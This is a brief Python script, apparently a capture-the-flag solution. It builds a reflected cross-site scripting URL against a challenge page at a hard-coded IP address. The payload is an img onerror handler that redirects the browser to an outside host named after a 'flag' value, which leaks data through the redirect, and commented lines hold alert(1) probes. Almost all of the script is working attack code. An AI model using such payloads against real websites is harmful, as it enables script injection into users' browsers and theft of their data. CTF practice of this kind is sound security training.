# <img src=x onerror='alert(1)'>
import requests
session=requests.Session()

# payload="<img src=x onerror='alert(1)'>"


# javascript=f'document.location="{url+?flag=`${alert(1)}`}"'
payload="<img src=x onerror='var flag="+'"ciyypjz"'+";document.location=`http://${flag}`'>"
url="http://34.77.37.110/cool-effect/"
url=(url+f'?name={payload}')
print('The flag is in the following link'+url)


